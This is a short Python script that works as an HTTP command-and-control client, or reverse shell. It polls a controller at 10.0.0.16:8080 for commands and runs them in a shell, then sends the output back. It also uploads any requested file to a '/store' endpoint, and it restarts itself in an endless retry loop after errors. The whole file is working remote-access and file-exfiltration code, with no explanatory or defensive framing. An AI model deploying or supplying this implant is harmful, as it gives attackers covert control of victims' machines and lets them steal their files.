import random
import subprocess
import requests
import time
import os


def main():
    while True:
        req = requests.get('http://10.0.0.16:8080')
        command = req.text
        if 'terminate' in command.lower():
            break
        elif 'grab' in command.lower() or 'download' in command.lower():
            grab, path = command.split('*')
            if os.path.isfile(path):
                files = {'file': open(path, 'rb')}
                requests.post('http://10.0.0.16:8080/store', files=files)
            else:
                requests.post('http://10.0.0.16:8080/store', data='[-] Not able to find the requested file!'.encode())
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            requests.post('http://10.0.0.16:8080', data=CMD.stdout.read())
            requests.post('http://10.0.0.16:8080', data=CMD.stderr.read())
        time.sleep(3)


if __name__ == '__main__':
    while True:
        try:
            main()
        except Exception:
            sleep_for = random.randint(1, 10)
            time.sleep(sleep_for)
